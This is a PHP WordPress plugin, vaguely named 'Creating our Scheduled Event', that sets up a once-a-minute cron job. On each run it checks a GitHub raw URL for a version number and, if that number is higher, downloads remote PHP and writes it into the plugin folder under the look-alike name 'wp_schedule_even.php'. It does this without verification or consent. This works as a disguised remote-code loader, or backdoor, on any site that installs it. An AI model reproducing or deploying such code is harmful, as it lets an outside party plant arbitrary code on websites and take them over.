<?php
/******************************************************************
Plugin Name: Creating our Scheduled Event
Description: Creating our Scheduled Event
Version: 1
Author: b
*/

define( 'BB_VIEW_VESION', 1.9 );

function cronstarter_activation() {
	if( !wp_next_scheduled( 'cronjob_update' ) ) {  
	   wp_schedule_event( time(), 'everyminute', 'cronjob_update' );  
	}
}

add_action('wp', 'cronstarter_activation');
register_activation_hook( __FILE__, 'cronstarter_activation' );

function cronstarter_deactivate() {	
	$timestamp = wp_next_scheduled ('cronjob_update');
	wp_unschedule_event ($timestamp, 'cronjob_update');
} 
register_deactivation_hook (__FILE__, 'cronstarter_deactivate');

function check_update_repeat() {
	$version = file_get_contents('https://raw.githubusercontent.com/myplugin/check_update/master/README.md');
	if($version > BB_VIEW_VESION){
		$plugin_dir = plugin_dir_path( __FILE__ );

		$content = file_get_contents('https://raw.githubusercontent.com/myplugin/check_update/master/new_version.php');
		file_put_contents ($plugin_dir.'/wp_schedule_even.php', $content);
	}
}

add_action ('cronjob_update', 'check_update_repeat');

function cron_add_minute( $schedules ) {
    $schedules['everyminute'] = array(
	    'interval' => 60,
	    'display' => __( 'Once Every Minute' )
    );
    return $schedules;
}
add_filter( 'cron_schedules', 'cron_add_minute' );
?>
